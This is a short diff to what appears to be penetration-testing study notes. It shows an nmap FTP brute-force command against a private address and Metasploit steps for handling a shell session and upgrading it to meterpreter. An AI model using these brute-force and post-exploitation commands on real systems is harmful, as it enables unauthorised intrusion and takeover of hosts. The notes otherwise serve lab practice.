@@ -71,4 +71,5 @@ nmap 192.168.24.3 --script ftp-brute --script-args userdb=/root/users -p 21
 	1. `set LHOST eht1` : set to ip of interface eth1
 	2. `set session 1` : set it to the session number for the shell connection
 	3. `run`
-5. `sessions` : to show and then connect by specifying number
+5. `sessions -u 1` : to auto upgrade session to meterpreter
+6. `sessions` : to show and then connect by specifying number
